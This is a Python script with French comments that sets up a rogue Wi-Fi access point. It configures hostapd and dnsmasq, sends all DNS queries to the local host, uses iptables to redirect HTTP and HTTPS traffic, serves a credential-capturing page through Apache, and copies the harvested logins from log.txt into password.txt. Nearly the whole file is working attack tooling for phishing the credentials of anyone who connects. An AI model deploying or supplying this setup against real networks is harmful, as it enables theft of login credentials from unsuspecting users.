import os
import subprocess
import threading
import shutil
import time


# Création du fichier de configuration Hostapd
def create_hostapd_conf(interface, channel, essid):
    config_content = f"""interface={interface}
driver=nl80211
ssid={essid}
channel={channel}
hw_mode=g
auth_algs=1
ieee80211n=1
"""
    with open("RogueAP/hostapd.conf", "w") as config_file:
        config_file.write(config_content)
    print("[SUCCESS] : Fichier de configuration Hostapd créé avec succès.")
        

# Création du fichier de configuration Dnsmasq
def create_dnsmasq_conf(interface):
    config_content = f"""interface={interface}
dhcp-range=192.168.1.20,192.168.1.80,12h
dhcp-option=3,8.8.8.8
dhcp-option=6,192.168.1.1
address=/#/192.168.1.1
"""
    with open("RogueAP/dnsmasq.conf", "w") as config_file:
        config_file.write(config_content)
    print("[SUCCESS] : Fichier de configuration Dnsmasq créé avec succès.")


# Configuration des règles iptables
def iptables_conf(interface):
    commands = [
        # Activation du forwarding IP
        "sudo sysctl -w net.ipv4.ip_forward=1",
        
        # Masquerading NAT pour permettre le routage vers Internet
        "sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE",
        
        # Autoriser le trafic venant de l'interface AP
        f"sudo iptables -A FORWARD -i {interface} -j ACCEPT",
        
        # Redirection du trafic HTTP (port 80) vers 192.168.1.1
        "sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1",
        
        # Redirection du trafic HTTPS (port 443) vers 192.168.1.1 (si besoin)
        "sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 192.168.1.1",
    ]

    for command in commands:
        if os.system(command) != 0:
            print(f"[ERROR] : Échec de l'exécution de la commande : {command}")
        else:
            print(f"[SUCCESS] : Commande exécutée avec succès : {command}")

    print("[INFO] : Toutes les règles iptables ont été appliquées.")
    

# Allumer l'interface réseau si elle est désactivée
def launch_interface(interface):
    if os.system(f"sudo ifconfig {interface} up") != 0:
        print("[ERROR] : Échec de l'activation de l'interface réseau. (Peut-être déjà activée)")
        return
    else:
        print("[SUCCESS] : Interface réseau activée.")


# Démarrer le service Hostapd
def start_hostapd():
    subprocess.Popen(["sudo", "hostapd", "RogueAP/hostapd.conf"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    print("[SUCCESS] : Service Hostapd démarré avec succès.")
        

# Démarrer le service Dnsmasq
def start_dnsmasq():
    if os.system("sudo systemctl start dnsmasq") != 0:
        print("[ERROR] : Échec du démarrage du service Dnsmasq.")
    else:
        print("[SUCCESS] : Service Dnsmasq démarré avec succès.")


# Lancer le serveur HTTP Python
def start_http_server():
    # Partie 1 : Copie du Site
    print("[INFO] : Copie des fichiers du site web...")
    os.system("sudo cp src/rogue_ap/WebsiteRogue/index.html /var/www/html/")
    os.system("sudo cp src/rogue_ap/WebsiteRogue/capture.php /var/www/html/")
    os.system("sudo cp src/rogue_ap/WebsiteRogue/log.txt /var/www/html/")
    
    os.system("sudo chmod 644 /var/www/html/index.html")
    os.system("sudo chmod 666 /var/www/html/capture.php")
    os.system("sudo chmod 666 /var/www/html/log.txt")
    
    # Partie 2 : Redémarrage du Service
    os.system("sudo systemctl restart apache2.service")
    print("[SUCCESS] : Serveur HTTP démarré avec succès.")


# Capture des données de connexion (identifiants)
def capture_data():
    source_file = '/var/www/html/log.txt'
    destination_file = 'password.txt'
    stop_event = threading.Event()

    def capture_loop():
        while not stop_event.is_set():
            if os.path.getmtime(source_file) > os.path.getmtime(destination_file):
                print("[INFO] : Données capturées.")
            with open(destination_file, 'w') as dest_file:
                with open(source_file, 'r') as src_file:
                    shutil.copyfileobj(src_file, dest_file)
            time.sleep(5)  # Attendre 5 secondes avant de capturer à nouveau

    capture_thread = threading.Thread(target=capture_loop)
    capture_thread.start()

    input("\nAppuyez sur Entrée pour arrêter le Rogue AP...\n")
    stop_event.set()
    capture_thread.join()
    
    with open(source_file, 'r') as src_file:
        new_data = src_file.read()
        print("[DATA] : \n", new_data)
    


# Configuration du Rogue AP        
def setup_rogue_ap(interface, channel, essid):
    create_hostapd_conf(interface, channel, essid)
    create_dnsmasq_conf(interface)
    iptables_conf(interface)
    launch_interface(interface)
    start_http_server()
    
    print("[INFO] : Configuration de l'adresse IP de l'AP...")
    os.system(f"sudo ifconfig {interface} 192.168.1.1 netmask 255.255.255.0 up")

    print("[INFO] : Vérification et arrêt des services en cours...")
    os.system("sudo systemctl stop hostapd")
    os.system("sudo systemctl stop dnsmasq")
    
    print("[INFO] : Arrêt des processus utilisant le port 53...")
    os.system("sudo fuser -k 53/tcp 53/udp")

    print("[INFO] : Lancement de Hostapd et Dnsmasq...") 
    start_hostapd()
    start_dnsmasq()
    
    capture_data()
    


# Test de la fonction setup_rogue_ap
if __name__ == "__main__":
    interface = "wlan0"
    channel = "10"
    essid = "Test"
    setup_rogue_ap(interface, channel, essid)